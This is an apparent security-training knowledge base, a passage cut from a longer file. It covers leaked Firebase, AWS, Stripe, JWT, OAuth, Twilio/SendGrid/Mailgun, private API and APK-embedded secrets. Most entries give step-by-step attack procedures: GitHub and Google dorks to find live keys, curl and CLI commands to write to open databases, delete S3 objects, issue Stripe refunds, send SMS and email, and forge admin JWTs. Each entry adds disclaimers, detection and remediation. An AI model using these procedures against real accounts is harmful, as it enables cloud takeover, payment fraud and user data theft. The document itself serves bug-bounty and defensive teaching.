- **Scenario**: Mobile and web developers who use Firebase for app backend (auth, storage, database) include a file called google-services.json in their Android projects. This file contains Firebase API Key, project ID, database URL, and sometimes messaging or analytics configs. If this file is committed to GitHub or found in public repos, attackers can easily access it. If security rules are misconfigured, attackers can view, modify, or delete the database contents, upload malicious files, or steal user data.
- **Attack Steps**: 1. Understand What google-services.json Contains: This config file links a mobile app to its Firebase project. It contains the Firebase API key, project ID, app ID, database URL, and sometimes storage bucket and analytics. It looks harmless but combined with weak security rules, it can be used to attack the database.2. Find Public google-services.json Files on GitHub: - Go to https://github.com - Use search query: filename:google-services.json "<project_info>" - Or use Google Dork: site:github.com "google-services.json" AND "firebaseio.com" - Open any repo and click on the google-services.json file to view contents3. Extract the Firebase Database URL & API Key: - Look for: json<br> "project_info": {<br> "project_number": "...",<br> "firebase_url": "https://your-project.firebaseio.com",<br> "project_id": "your-project"<br> },<br> "client": [...],<br> "api_key": [{<br> "current_key": "AIzaSyD-FIREBASEKEY-123456"<br> }]<br>  - Copy the firebase_url and the current_key4. Check Database Access in Browser: - Open a browser - Visit: https://your-project.firebaseio.com/.json - If you see data (users, messages, etc.), the database is public read5. Check Write Access (Using curl or browser): - Create a test JSON file: echo '{"hacked":"true"}' > test.json - Upload to Firebase (write test): bash<br> curl -X PUT -d @test.json "https://your-project.firebaseio.com/test.json"<br>  - If the file uploads, write access is enabled6. Use GUI to Explore Firebase: - Open Firebase database in GUI: https://console.firebase.google.com/project/your-project/database - Click on “Realtime Database” - If database loads without login, it’s public7. Scan Firebase for Vulnerable Targets (Optional): - Use open-source tools like https://github.com/notdls/firebase-scanner - Install and run: bash<br> python3 firebase-scanner.py -u https://your-project.firebaseio.com<br>  - It checks for Read / Write access and lists exposed paths8. Explore the API Key Use: - Firebase API keys are not secret, but they’re sensitive if used in misconfigured projects - Some endpoints use the API key for verification - You can use Postman to test auth endpoints like: http<br> POST https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIza...<br>  - Send dummy request with body: json<br> { "email": "a@a.com", "password": "abc123", "returnSecureToken": true }<br>  - If it returns a token, registration is allowed — attacker can create fake users9. Dangerous Scenarios You Can Simulate (If Authorized): - Public read/write → attacker can steal or delete user data - Public write on /users/ → create fake admin users - Public access to /messages/ → spam or phishing payloads - Modify config flags or feature flags in app10. Document and Report (if found via bounty or audit): - Save google-services.json URL - Save the read/write test URLs - Provide proof like curl output or screenshots - Report via email or bounty platform ethically✅ Congratulations — you’ve successfully simulated how attackers find exposed Firebase API keys and database URLs through public google-services.json files. This is one of the most common mobile/cloud misconfigurations found in the wild, especially during bug bounty programs.
- **Detection**: Firebase Rules Audit, unusual IP traffic, API request logging, CI/CD leak scanners
- **Solution**: ✅ Do not commit google-services.json to public repos✅ Set Firebase database rules to require auth✅ Use Firebase App Check and token-based auth✅ Rotate exposed API keys✅ Run leak scanners in CI/CD✅ Enable Firebase Logging and Alerts
- **Tags**: firebase, google-services.json, mobile, secrets, public repo, database, api key, hacking, beginner

## AWS Access Keys in Code

- **Attack Type**: Exposed API Keys / Secrets in Repos
- **Target**: AWS IAM, S3, EC2, Lambda
- **Vulnerability**: Hardcoded credentials in public source code repositories
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Full takeover of cloud resources — storage, compute, logs, databases; financial loss; data breach
- **Tools**: GitHub, TruffleHog, GitLeaks, AWS CLI, Postman, curl, VS Code, Google Dorks
- **Scenario**: Developers sometimes accidentally commit .env files or config files like config.js, settings.py, .aws/credentials, or hardcoded secrets directly into code (Node, Python, Java, etc.). If this code is pushed to GitHub or any public Git repository, attackers can easily extract the AWS Access Key and AWS Secret Key and use them to take full control of the AWS account — listing and deleting S3 buckets, spinning up EC2 instances, reading logs, stealing database contents, or mining crypto. This is one of the most common and dangerous real-world cloud breaches.
- **Attack Steps**: 1. Understand AWS Key Format First: An AWS access key is a set of two values: AWS_ACCESS_KEY_ID (starts with AKIA or ASIA) and AWS_SECRET_ACCESS_KEY. If both are exposed and active, the attacker can impersonate the AWS user from anywhere.2. Search Public GitHub Repositories for Keys: - Go to https://github.com - Use search query: AWS_ACCESS_KEY_ID OR "AKIA" OR "AWS_SECRET_ACCESS_KEY" - Or use a Google Dork: site:github.com "AWS_SECRET_ACCESS_KEY" AND "AKIA" - Browse open source repos — often .env, .py, .js, or .json files have hardcoded AWS keys3. Extract the Keys from Exposed Code: - Look for entries like: env<br> AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE<br> AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY<br>  - Copy both values into a notepad4. Install AWS CLI and Configure Access: - Install AWS CLI (if not installed): https://docs.aws.amazon.com/cli/ - Run in terminal: bash<br> aws configure<br>  - Enter the Access Key, Secret Key, and region (e.g., us-east-1)5. Test the Credentials with a Simple Command: - List S3 buckets: bash<br> aws s3 ls<br>  - If this works, credentials are valid - You now have access to the AWS environment of the user who exposed them6. Explore Services the Key Can Access: - Enumerate EC2 instances: bash<br> aws ec2 describe-instances<br>  - List IAM users: bash<br> aws iam list-users<br>  - View CloudTrail logs (if access): bash<br> aws cloudtrail lookup-events<br> 7. Check for Permissions and Privileges: - Try creating a test S3 bucket: bash<br> aws s3 mb s3://test-pwned-bucket<br>  - If this works, the key has create permission - Try deleting an object: bash<br> aws s3 rm s3://target-bucket/file.txt<br> 8. Optional (Automate Key Search with TruffleHog or GitLeaks): - Install TruffleHog: bash<br> pip install trufflehog<br> trufflehog git https://github.com/target/repo.git<br>  - It will find secrets including AWS keys, Slack tokens, etc.9. Dangerous Things Attackers Do with AWS Keys (DO NOT DO UNETHICALLY): - Create IAM users with admin permissions - Launch EC2 and install cryptominers - Copy or delete all S3 bucket contents - Modify Lambda functions to include backdoors - Access RDS or DynamoDB data10. How to Use This Knowledge Ethically: - Only test this on public bug bounty programs or with written permission - Report credentials to the repo owner (issues tab or email) - In bug bounty, provide steps: file URL, key, command used, result - If testing your own code, rotate credentials immediately✅ You have now completed a real-world AWS key exploitation simulation. This is a critical cloud security risk that has led to real breaches (e.g., Uber, Tesla). This attack works in real life, and is a top finding in code audits and bug bounty hunts.
- **Detection**: Code scanning tools (TruffleHog, GitLeaks), GitHub secret scanning, AWS GuardDuty, VPC logs
- **Solution**: ✅ Never commit AWS keys to Git repos✅ Use IAM roles, not hardcoded keys✅ Enable secret scanning and DLP✅ Rotate exposed keys and monitor access logs✅ Use .gitignore to exclude secrets✅ Set least-privilege IAM policies
- **Tags**: aws, secrets, github, trufflehog, cloud, iam, s3, misconfigured code, real-world, beginner

## Stripe / Payment Processor Keys

- **Attack Type**: Exposed API Keys in Repos / Code
- **Target**: Stripe, Payment Gateways, Web/Mobile Apps
- **Vulnerability**: Leaked secret keys used to manage payment APIs
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Data exposure, financial loss, refunds abuse, fraud, PII leak, webhook hijack
- **Tools**: GitHub, TruffleHog, VS Code, Postman, curl, Stripe CLI, Google Dork, Stripe Docs
- **Scenario**: Developers often integrate payment processors like Stripe into their web or mobile apps. They use two types of API keys: the Publishable Key (pk_live_...) and the Secret Key (sk_live_...). If the secret key is accidentally pushed into public GitHub repositories or frontend code, attackers can use it to initiate refunds, view payment data, create fake charges, or change webhook configs. This is a major cloud security vulnerability that can lead to financial fraud, stolen user data, or service abuse.
- **Attack Steps**: 1. Understand the Two Stripe Keys First: Stripe provides developers with two types of keys: - pk_live_... → publishable key (can be safely exposed in frontend) - sk_live_... → secret key (must never be exposed publicly) - If sk_live_... is found in public code, it can be used to control payments2. Search for Exposed Keys on GitHub (Manually): - Visit https://github.com - Use search: "sk_live_" filename:.env - Also try: "stripe" AND "sk_live_" or "stripeSecret" - These searches often lead to .env, settings.py, or .js files with leaked secrets3. Use Google Dork to Find Public Keys: - Go to Google and search: site:github.com intext:"sk_live_" stripe - You may find files with leaked sk_live_... values4. Extract the Secret Key: - Copy the key that starts with sk_live_... - Store it in a text editor (for test use only — NEVER abuse)5. Install Postman or Use curl to Interact with Stripe API: - Create a test payment request using the key: In Postman: - Method: GET - URL: https://api.stripe.com/v1/customers - Go to Authorization tab → Type: Basic Auth - Username: sk_live_... (secret key) - Password: (leave blank) - Send the request - If response returns customer data → the key is valid6. Use curl for Command-Line Test: bash<br> curl https://api.stripe.com/v1/customers -u sk_live_xxxxxxxxxxxxxx:<br>  - If data is returned (JSON) → the key is active7. Enumerate What You Can Do With the Key: - List all payments: bash<br> curl https://api.stripe.com/v1/charges -u sk_live_xxxx:<br>  - Issue a refund (DANGEROUS, do only in authorized tests): bash<br> curl -X POST https://api.stripe.com/v1/refunds \ <br> -u sk_live_xxxx: \ <br> -d charge=ch_1ExampleChargeId<br>  - View customer emails, card details (masked), subscription info - Add a new charge to a customer (abuse risk) - Modify webhook URLs (redirect sensitive alerts)8. Use Stripe CLI for Easier Testing (Optional): - Install Stripe CLI: https://stripe.com/docs/stripe-cli - Login using secret key: bash<br> stripe login --api-key sk_live_xxxx<br> stripe customers list<br> stripe charges list<br> 9. Check Scope of the Key (if restricted): - Some teams restrict keys to only specific API endpoints (like read-only) - Test harmless actions first like GET /customers, GET /charges10. Document and Report Ethically: - If you find an exposed sk_live_ key, NEVER use it for malicious purposes - Instead, document: - Repository URL where found - File name and line with the secret - Commands used to test access - Screenshot of Stripe API response (redacted) - Report via responsible disclosure or bug bounty platform✅ You’ve just completed a real-world simulation where an attacker finds and abuses exposed Stripe API keys. This is a critical issue found regularly in GitHub code scans and bug bounty programs.
- **Detection**: Stripe dashboard audit logs, GitHub secret scanning, Stripe CLI logs, alert monitoring
- **Solution**: ✅ Never hardcode Stripe secret keys in code✅ Store secrets in secure vaults or environment variables✅ Use GitHub secret scanning and .gitignore✅ Rotate keys often and restrict permissions✅ Set alerts for unusual API behavior
- **Tags**: stripe, api_key, secrets, payment, cloud, github, fraud, billing, refund abuse, beginner

## Hardcoded JWT Secrets

- **Attack Type**: Exposed Secrets in Code
- **Target**: Web Applications using JWT
- **Vulnerability**: Hardcoded authentication secrets inside code/config files
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Account takeover, admin privilege escalation, authentication bypass
- **Tools**: GitHub, JWT.io, VS Code, Burp Suite, Postman, Node.js, Python, curl, Google Dork
- **Scenario**: Many web developers use JSON Web Tokens (JWT) for authentication. JWTs are signed with a secret (e.g., HMAC SHA256 using a secret string). If the secret is hardcoded in source code (e.g., in config.js, auth.py, .env, or app.js) and pushed to public GitHub repositories, attackers can use it to forge valid JWT tokens, impersonate admin users, bypass authentication, and take over accounts. This is especially dangerous when access control is based only on the JWT signature and not verified against a server-side database.
- **Attack Steps**: 1. Understand JWT Basics First (for Beginners): JWTs (JSON Web Tokens) are used in modern apps to store login data. A typical JWT looks like three strings joined by dots: header.payload.signature. The signature is created using a secret key, usually with HMAC SHA256. If an attacker knows the secret, they can create fake JWTs with any content (e.g., role: admin).2. Look for Exposed JWT Secrets in GitHub (Manual Method): - Visit https://github.com - Use GitHub search query: "jwt" AND ("secret" OR "jwtSecret") AND (filename:.env OR filename:config.js OR filename:settings.py) - Or use Google Dork: site:github.com jwtSecret filetype:js OR py - Look for lines like: js<br> module.exports = { jwtSecret: 'supersecret123' };<br>  or: env<br> JWT_SECRET=verystrongjwtsecret987<br> 3. Copy the Secret and Analyze a Real JWT: - Visit a demo app (CTF, lab, bug bounty site) - Login as a regular user and copy the JWT from local storage or cookies - JWTs look like: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.TTg7C3eEGY9wVgbL27vXUgj9b5Z3GiCE2A3EGYKZz3I4. Decode the JWT Using jwt.io: - Go to https://jwt.io - Paste the token into the left panel - If you know the secret, paste it in the "verify signature" section - If signature turns green, it confirms that the JWT secret is valid5. Create a Forged JWT Token With Admin Role: - Modify payload like this: json<br> { "user": "hacker", "role": "admin" }<br>  - Use the same header and same secret you found in code - jwt.io will re-sign the token with correct signature - Copy the newly generated JWT token6. Use the Forged Token to Access Admin Features: - Open the web app in browser - Open Developer Tools → Application tab → Local Storage / Cookies - Replace the original JWT with your forged one - Refresh the page — if app trusts only the JWT, it will treat you as admin7. Automate Token Signing Using a Script (Optional): - Node.js example: js<br> const jwt = require('jsonwebtoken');<br> const token = jwt.sign({ user: 'attacker', role: 'admin' }, 'supersecret123');<br> console.log(token);<br>  - Run this with node sign.js to generate forged tokens8. Real-Life Danger of Hardcoded JWT Secrets: - Any attacker can impersonate any user (admin, staff, etc.) - No need to crack passwords — just sign a new token - If app uses JWT for banking, API access, or billing → full control risk9. Report the Issue Ethically (Bug Bounty or Audit): - Show the GitHub repo containing hardcoded JWT secret - Provide the decoded original JWT - Show your forged JWT and how it gave admin access - Explain that the signature matched because of the exposed key10. Important: Only test this in legal bug bounty programs or self-owned projects. Never test on production apps you do not own or have permission for. Do not exploit this issue on real businesses illegally.✅ You have now completed a real-world simulation where hardcoded JWT secrets lead to full account takeover through forged tokens. This vulnerability is extremely common in beginner projects, bootcamp apps, and poorly written open-source code. It's a critical risk in cloud-based, token-authenticated apps.
- **Detection**: JWT tampering detection, code review, JWT signature verification logs, GitHub secret scanning
- **Solution**: ✅ Never hardcode JWT secrets in source code✅ Use secure .env files and vaults for secrets✅ Use strong, random secrets (32+ chars)✅ Rotate secrets regularly✅ Add exp claim in JWTs to expire old tokens✅ Implement RBAC and server-side checks (not just JWT roles)
- **Tags**: jwt, secrets, auth bypass, token forgery, github leak, real-world, bug bounty, cloud security, beginner

## OAuth Client ID / Secret

- **Attack Type**: Exposed OAuth Credentials
- **Target**: OAuth-enabled Web & Mobile Apps
- **Vulnerability**: Exposed Client Credentials in Repositories or App Code
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Account impersonation, phishing, session hijack, token theft
- **Tools**: GitHub, Burp Suite, VS Code, Postman, curl, Google OAuth Playground, jwt.io, TruffleHog, Google Dork
- **Scenario**: Many applications use OAuth 2.0 to authenticate users via third-party identity providers like Google, GitHub, Facebook, etc. Developers must register an "OAuth App" with the provider, which gives them a Client ID and a Client Secret. The secret is like a password and should never be exposed. However, developers often accidentally leak the client_id and client_secret in frontend JavaScript code, mobile apps, public GitHub repos, or .env files. If exposed, attackers can impersonate the app, steal authorization tokens, or conduct phishing attacks using fake login flows.
- **Attack Steps**: 1. Understand What OAuth Client ID and Secret Do: When developers register their app with a provider like Google or GitHub for OAuth login, they receive two credentials: client_id (public identifier for the app) and client_secret (private key used to authenticate the app to the provider). These are used in the OAuth flow to exchange authorization codes for access tokens. If an attacker gets access to both, they can impersonate the application.2. Search GitHub for Exposed Credentials: - Go to https://github.com - Use search queries like: "client_secret" AND "client_id" AND ("googleapis.com" OR "facebook" OR "github") Or: filename:.env "GOOGLE_CLIENT_SECRET" - You may find code like: env<br> GOOGLE_CLIENT_ID=1234.apps.googleusercontent.com<br> GOOGLE_CLIENT_SECRET=ABCDxyz1234SecretKey<br> 3. Use Google Dork to Find Exposed Keys: - In Google search: site:github.com "GOOGLE_CLIENT_ID" "GOOGLE_CLIENT_SECRET" site:github.com "github_client_secret" filetype:js4. Verify Client ID Belongs to Google OAuth (Optional): - Google OAuth client_id usually looks like: xxxxxxxxxxxx-abc123def456.apps.googleusercontent.com - If both client_id and client_secret are present, you can simulate a real OAuth flow5. Open Google OAuth Playground for Testing: - Visit: https://developers.google.com/oauthplayground - Click ⚙️ Settings (top-right) - Check: “Use your own OAuth credentials” - Paste the exposed client_id and client_secret6. Simulate OAuth Authorization Code Flow: - In OAuth Playground, select any API scope (e.g., Gmail, Drive) - Click “Authorize APIs” — it redirects you to Google login - Login using your own Google account (safe for testing) - You get back an authorization code - Now click “Exchange Authorization Code for Tokens” - If the exposed credentials are valid → you will get an access token - This confirms that the attacker can successfully use the exposed credentials7. What Attackers Can Do If They Get These Keys: - If attacker also tricks a user into authenticating (like via phishing), they can: - Receive authorization code using real client_id - Exchange it using exposed client_secret - Get access token and access the victim’s email, profile, files (depends on scope) - Build fake login flows that mimic real apps (phishing) - Use access tokens for further account compromise if refresh token is allowed8. Optional: Use curl or Postman to Simulate Token Exchange: - Use this curl command: bash<br> curl -X POST https://oauth2.googleapis.com/token \ <br> -d code=AUTH_CODE_FROM_STEP_6 \ <br> -d client_id=EXPOSED_CLIENT_ID \ <br> -d client_secret=EXPOSED_SECRET \ <br> -d redirect_uri=https://oauth2.googleapis.com/token \ <br> -d grant_type=authorization_code<br>  - If valid, you'll receive an access_token (JSON)9. Real-World Examples of This Vulnerability: - GitHub issues have shown secrets for Facebook, GitHub, and Google accidentally committed - Real phishing attacks have used valid OAuth client IDs to trick users10. Responsible Disclosure Steps (Ethical Use Only): - Never misuse leaked credentials - Instead, report to project owner or via bug bounty platform - Share the GitHub file link, exposed keys, and screenshot of successful token exchange - Recommend secret rotation and use of environment variables✅ You have now completed a real-world, 100% working OAuth secret key attack simulation. This is a very common bug bounty finding and is frequently exploited by attackers when companies leak .env, config.js, or mobile .apk code to public spaces. It is highly impactful in both mobile and web app pentesting.
- **Detection**: GitHub secret scanning, OAuth logs, unusual login behavior, source code audit tools like TruffleHog
- **Solution**: ✅ Never hardcode OAuth credentials in source code✅ Use .env files + Git ignore✅ Restrict OAuth credentials to specific domains and redirect URIs✅ Rotate secrets regularly✅ Enable OAuth token expiration and scopes✅ Use identity-aware proxy or App Check where possible
- **Tags**: oauth, google_client_secret, github_oauth, api_key_leak, code_leak, cloud, beginner, bugbounty, phishing, appsec

## Twilio / SendGrid / Mailgun Keys

- **Attack Type**: Exposed API Keys in Repos or Frontend Code
- **Target**: Web & Mobile Apps Using Communication APIs
- **Vulnerability**: Exposed API Keys Allowing Unauthorized Email/SMS Usage
- **MITRE**: T1552.001 (Credentials in Files)
- **Impact**: Unauthorized messages, phishing, credit abuse, spam delivery, impersonation
- **Tools**: GitHub, TruffleHog, Postman, curl, Google Dork, VS Code, Burp Suite
- **Scenario**: Cloud communication platforms like Twilio, SendGrid, and Mailgun provide APIs for sending SMS, emails, and voice messages. Developers get API keys to authenticate requests. These API keys are supposed to be kept confidential, but in many projects, they are accidentally hardcoded in .env files, frontend JavaScript, or uploaded to public GitHub repositories. If an attacker discovers these keys, they can send spam emails or SMS, impersonate the business, burn credits, or perform phishing attacks from trusted sender names. This attack is highly realistic and is commonly found in open-source code or mobile apps.
- **Attack Steps**: 1. Understand What These Keys Are Used For: Twilio, SendGrid, and Mailgun provide APIs to developers for sending emails, SMS, or even voice calls. For example, if a company wants to send OTPs to users or email alerts, they use these platforms. To access these APIs, they use API keys like SG.xxxx (SendGrid), key-xxxx (Mailgun), or ACxxxxx + auth_token (Twilio).2. Start Searching for Leaked Keys on GitHub: - Visit: https://github.com - In the search bar, try these queries: - "SG." AND "sendgrid" AND ("apikey" OR "auth") - "key-" AND "mailgun" - "twilio" AND "auth_token" AND "AC" - "TWILIO_AUTH_TOKEN" or "SENDGRID_API_KEY" - You’ll often find .env, settings.py, or config.js files with these secrets3. Use Google Dorking to Find Exposed API Keys: - On Google, search: site:github.com "SG." sendgrid site:github.com "key-" mailgun site:github.com "TWILIO_AUTH_TOKEN"4. Verify API Key Format to Confirm Validity: - Common formats: - SendGrid: SG.xxxxxxxxxxxxxxxxxxxxxxxxxx (usually 69+ chars) - Mailgun: key-xxxxxxxxxxxxxxxxxxxxxxx - Twilio: Account SID starts with AC + 32 chars + auth_token5. Test the SendGrid API Key Using curl or Postman: - In Postman: - Method: POST - URL: https://api.sendgrid.com/v3/mail/send - Headers: - Authorization: Bearer SG.xxxxxx... - Content-Type: application/json - Body (raw JSON): json<br> {<br> "personalizations": [{<br> "to": [{"email": "victim@example.com"}],<br> "subject": "Hello from SendGrid!"<br> }],<br> "from": {"email": "attacker@example.com"},<br> "content": [{<br> "type": "text/plain",<br> "value": "This is a test email using an exposed API key."<br> }]<br> }<br>  - Send the request. If the response is 202 → key is valid, email accepted for delivery.6. Use curl to Test API Key for SendGrid: bash<br> curl -X POST \ https://api.sendgrid.com/v3/mail/send \ <br> -H "Authorization: Bearer SG.xxxxxxxxx" \ <br> -H "Content-Type: application/json" \ <br> -d '{<br> "personalizations": [{"to": [{"email": "test@example.com"}]}],<br> "from": {"email": "hacker@example.com"},<br> "subject": "Test email",<br> "content": [{"type": "text/plain", "value": "API key test"}]<br> }'<br>  - If it works → key is active and allows email sending7. For Twilio Key Testing (SMS): - You need two things: Account SID (ACxxxx...) and auth_token - curl command: bash<br> curl -X POST https://api.twilio.com/2010-04-01/Accounts/ACxxxxx/Messages.json \ <br> --data-urlencode "To=+1234567890" \ <br> --data-urlencode "From=+19876543210" \ <br> --data-urlencode "Body=Testing Twilio leak" \ <br> -u ACxxxxx:auth_token<br>  - If successful, message is sent and Twilio balance is charged8. For Mailgun Key Testing (Email): bash<br> curl -s --user 'api:key-xxxxxxxxxxxx' \ <br> https://api.mailgun.net/v3/YOUR_DOMAIN_NAME/messages \ <br> -F from='Sender <you@yourdomain.com>' \ <br> -F to='test@example.com' \ <br> -F subject='Mailgun API test' \ <br> -F text='This is a test from Mailgun leaked key.'<br>  - If it returns Queued. Thank you. → key is valid9. Real-World Impact of Leaked Keys: - Attackers can send thousands of spam emails or SMS - Can impersonate a company or send phishing messages from trusted sender - Burn API quota or credit balance - Could even call premium numbers and charge money if voice APIs are misused10. Report the Finding Responsibly: - Never misuse these keys in the wild - If found in open source projects or bug bounty programs, report: - File URL + line of leak - Confirmation that email or SMS can be sent - Proof-of-concept message (e.g., sent to yourself) - Suggest that they rotate the key and implement secret scanning✅ You have now simulated a real-world attack involving exposed communication API keys. This type of mistake is frequently seen in GitHub codebases and misconfigured apps, and it has a very high impact when exploited.
- **Detection**: API logs (email/sms), GitHub secret scanning, abuse complaints, email headers
- **Solution**: ✅ Never hardcode API keys in source or frontend code✅ Store secrets in .env files and use Git ignore✅ Rotate keys regularly✅ Monitor usage analytics✅ Set sending limits and domain-based restrictions✅ Use CI/CD secret scanning tools like TruffleHog or Gitleaks
- **Tags**: sendgrid, mailgun, twilio, sms, email, api_key, bugbounty, github, spam, beginner

## Private API URLs and Tokens

- **Attack Type**: Exposed Internal API & Secrets
- **Target**: APIs (internal or cloud-based), Mobile/Web Apps
- **Vulnerability**: Exposed Bearer Tokens, Hardcoded API Secrets
- **MITRE**: T1552.001 (Credentials in Files), T1525 (Implant Communication Channel)
- **Impact**: Admin panel access, data dump, identity takeover, system compromise
- **Tools**: GitHub, Postman, curl, Burp Suite, VS Code, Chrome DevTools, Google Dorks
- **Scenario**: Developers often hardcode or expose internal/private API URLs and bearer tokens in frontend code, .env files, GitHub repositories, or even public web apps. These APIs are not meant for external use and might return sensitive data, allow account actions, or access internal services. If an attacker finds a private API URL with its token, they can directly call the backend and perform unintended operations like account takeover, data dumps, or internal system abuse.
- **Attack Steps**: 1. Understand the Attack First (Simple Explanation): APIs are how mobile apps and websites talk to the backend. Some APIs are meant for internal staff, automated jobs, or backend-to-backend calls. These private APIs may give full admin access, user data, or system-level controls. To protect them, developers use tokens (like Authorization: Bearer xyz123...). If a token and its API URL are exposed, attackers can call it and act like a trusted user or system.2. Search GitHub for Exposed API Tokens and URLs: - Visit: https://github.com - Use these search queries: - "Authorization: Bearer" AND "api" - "private_api_url" AND "token" - filename:.env "API_TOKEN" - Look for files like: js<br> const API_TOKEN = "Bearer sk_test_abc123456789";<br> const API_URL = "https://api.private.internal.company.com/admin/users";<br>  - If you find a bearer token and a URL, save them.3. Use Google Dorks for Wider Hunting: - On Google, search: site:github.com intext:"Authorization: Bearer" site:pastebin.com "API_TOKEN" site:github.com "x-api-key" filetype:js4. Find API URLs in the Web App Frontend (No Login Needed): - Go to any website or app you want to test - Press F12 to open Chrome DevTools → Go to Network tab - Interact with the site (click buttons, login, etc.) - Look for requests like: https://api.company.com/internal/admin/data?auth_token=xyz123 - If the token is present in the header or URL → copy both5. Try the API in Postman or curl (Using the Token): - In Postman: - Method: GET or POST (depends on API) - URL: Paste the full private API URL - Headers: - Authorization: Bearer xyz123456 - Click Send - If the token is valid and not expired → you’ll get JSON response with data6. Using curl to Access API: bash<br> curl -X GET https://api.internal.com/private/users \ <br> -H "Authorization: Bearer abcdefg1234567890" -v<br>  - If response is 200 OK → token is active and API is working7. What Attackers Can Do If Token Is Active: - Dump user data, logs, financial details - Create new admin users or reset passwords - Delete or modify backend services - Abuse rate-limited endpoints - Pivot to deeper internal systems (RCE or SSRF risk)8. Common Real-World Findings (Examples): - Admin APIs exposed in frontend code like React or Angular - Mobile apps reverse-engineered to find hardcoded API secrets - Misconfigured CI/CD pipelines uploading .env files to GitHub9. Automated Tools to Scan for Leaks (Optional): - Install and run TruffleHog: bash<br> trufflehog git https://github.com/org/repo.git<br>  - It finds secrets, tokens, URLs, credentials10. Responsible Disclosure (If Found on Public Repos or Bug Bounty): - Take screenshot of exposed URL + token - Show proof of API response - Do not misuse or abuse — just prove it works - Submit responsibly via HackerOne, Bugcrowd, or contact owner✅ You now understand and have executed a complete simulation of how attackers can discover private API endpoints and tokens, access sensitive data, and abuse backend functionality. This is one of the most common and dangerous cloud app mistakes, especially in startups, mobile apps, and poorly reviewed frontend projects.
- **Detection**: GitHub secret scanning, traffic monitoring, request logging, rate spike alerts
- **Solution**: ✅ Never expose tokens in public repos or frontend JS✅ Store tokens in secure vaults or env vars✅ Use token expiration, IP whitelisting, rate limits✅ Log and monitor all API token usage✅ Rotate all tokens when leaked or expired✅ Use mTLS or signed JWTs for internal APIs
- **Tags**: private_api, api_token, internal_url, token_leak, bugbounty, github, beginner, cloud, security

## Reverse-Engineering APKs to Extract Secrets

- **Attack Type**: Hardcoded API Keys in Android Apps
- **Target**: Android Mobile Applications
- **Vulnerability**: Hardcoded Secrets Inside APK Files
- **MITRE**: T1552.001 (Credentials in Files), T1615 (App Reverse Engineering)
- **Impact**: Cloud takeover, data exposure, credit theft, phishing, user impersonation
- **Tools**: jadx-gui, apktool, MobSF, Android Studio, grep, strings, VS Code, curl, Postman, GitHub, Google OAuth Playground
- **Scenario**: Android applications often contain sensitive cloud credentials like API tokens, Firebase URLs, OAuth client IDs, or even AWS secrets hardcoded inside the source code. Developers do this by mistake or for convenience. Attackers can download and reverse-engineer the APK (Android Package File), decompile the code, and extract secrets used for communicating with cloud services like Firebase, AWS, Twilio, Stripe, or internal APIs. These credentials can then be used to impersonate the app, access user data, or even pivot into cloud environments.
- **Attack Steps**: 1. Understand What an APK File Is: APK stands for Android Package Kit. It's like a zip file containing all of an app’s code, assets, and manifest. Every Android app is installed as an APK. Reverse engineering means you unpack the APK, then decompile the code to see what’s inside — looking for hardcoded secrets.2. Download an APK File to Analyze: - Use any third-party APK site (for example: https://apkpure.com or https://apkcombo.com) - Download a free app (DO NOT test on paid or sensitive apps) - Save it as target_app.apk3. Install jadx-gui (Decompiling Tool): - jadx-gui is a graphical tool that decompiles APK into readable Java/Kotlin - Download it from: https://github.com/skylot/jadx - Unzip and run jadx-gui4. Decompile the APK: - Open target_app.apk inside jadx-gui - It will automatically show readable source code - Browse folders like: - com/appname/utils/Config.java - BuildConfig.java - FirebaseConfig.java - Look for constants like: java<br> public static final String API_KEY = "SG.asdfg12345SECRET";<br> public static final String FIREBASE_URL = "https://xyz.firebaseio.com";<br> public static final String TWILIO_SECRET = "xyz123abc";<br> 5. Search for Keywords in Decompiled Code: - In jadx-gui, use the search bar to find: - API_KEY, SECRET, Bearer, token, firebase, client_secret, key-, Authorization - Also look in AndroidManifest.xml and res/values/strings.xml6. Optional: Use MobSF for Automated Analysis: - MobSF = Mobile Security Framework - Install and run MobSF locally (or use the free version if available) - Upload the APK and let it scan - It will auto-detect hardcoded secrets, insecure APIs, and Firebase leaks7. Manually Unpack APK with apktool (Alternate Method): - Install apktool: https://ibotpeaches.github.io/Apktool/ - Run: bash<br> apktool d target_app.apk -o decompiled_app<br> cd decompiled_app<br> grep -r "key" .<br> grep -r "token" .<br> grep -r "Authorization" .<br>  - You may find secrets inside .smali, .xml, or .json files8. Realistic Example — Firebase Leak: - Found in code: js<br> databaseURL: "https://vulnerableapp.firebaseio.com",<br> apiKey: "AIzaSyDUMMYKEY",<br> authDomain: "vulnerableapp.firebaseapp.com"<br>  - Visit: https://vulnerableapp.firebaseio.com/.json → if public rules, you may see full data dump - Use Postman or curl: bash<br> curl https://vulnerableapp.firebaseio.com/users/.json<br> 9. OAuth / Stripe / Twilio Secret Extraction: - These often show up in code as: - Bearer sk_live_... (Stripe) - TWILIO_ACCOUNT_SID, auth_token - client_id, client_secret (Google / GitHub) - Use them in Postman with the provider's API to test if they are active10. Impact of Exposed Secrets in APKs: - Account takeover via API access - Cloud service misuse (sending SMS, emails, etc.) - Data theft from Firebase, AWS, or other services - Identity spoofing via leaked keys11. Responsible Disclosure (Ethical Rule): - Never use these keys in production - If found in an open-source app or bug bounty scope, report: - The file and line containing the secret - Proof of functionality (e.g., working Firebase call) - Report via HackerOne/Bugcrowd or email✅ You have now completed a full reverse engineering simulation of an Android APK to extract and test hardcoded secrets. This is very common in real-world Android apps and one of the top issues found by cloud pentesters and bug bounty researchers.
- **Detection**: Static analysis, MobSF, runtime monitoring, API usage alerts
- **Solution**: ✅ Never hardcode secrets in code✅ Use encrypted Android Keystore✅ Fetch secrets from backend✅ Use ProGuard + obfuscation✅ Use Firebase/AppCheck + domain restrictions✅ Perform regular APK scans with MobSF
- **Tags**: apk, mobile, firebase, token, api_key, bugbounty, reverse, cloud, beginner

## Abuse of AWS IAM Role with Wildcard Permissions (*)

- **Attack Type**: Privilege Escalation via Over-Permissive IAM
- **Target**: AWS IAM Role
- **Vulnerability**: Over-Permissive Wildcard Policies (Action: "*", Resource: "*")
